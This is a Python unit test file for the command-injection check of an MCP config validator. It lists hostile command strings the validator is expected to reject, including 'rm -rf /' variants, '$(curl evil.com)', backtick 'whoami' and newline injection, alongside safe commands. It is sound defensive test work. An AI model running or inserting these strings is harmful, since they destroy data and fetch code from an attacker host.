"""Unit tests for MCP config validator (TDD: RED phase).

Tests security validation for:
- Command injection detection
- SSRF prevention
- Credential sanitization
"""

import pytest


class TestCommandInjectionValidation:
    """Test command injection detection and prevention."""

    def test_validate_command_injection_detected(self) -> None:
        """Reject commands with shell metacharacters."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        # Test various shell metacharacters
        dangerous_commands = [
            "python script.py; rm -rf /",  # Semicolon
            "node app.js && echo pwned",  # Double ampersand
            "cat file | grep secret",  # Pipe
            "$(curl evil.com)",  # Command substitution
            "`whoami`",  # Backtick command substitution
            "ls > output.txt",  # Redirection
            "echo $PATH",  # Variable expansion
            "rm -rf {home,root}",  # Brace expansion
            "cat file[0-9]",  # Bracket expansion
            "echo hello\nrm -rf /",  # Newline injection
            "echo test\\; rm -rf /",  # Escaped semicolon
        ]

        for command in dangerous_commands:
            with pytest.raises(ValueError, match="shell metacharacter"):
                validator.validate_command_injection(command)

    def test_validate_command_injection_safe_command(self) -> None:
        """Allow safe commands without metacharacters."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        # Safe commands should pass validation
        safe_commands = [
            "python",
            "node app.js",
            "/usr/bin/python3 script.py",
            "npx github-mcp-server",
            "docker-compose up",
            "/opt/bin/server --port=8080",
        ]

        for command in safe_commands:
            # Should not raise
            result = validator.validate_command_injection(command)
            assert result == command

    def test_validate_command_injection_null(self) -> None:
        """Handle None command gracefully."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        # None should be handled gracefully (no validation needed)
        result = validator.validate_command_injection(None)
        assert result is None
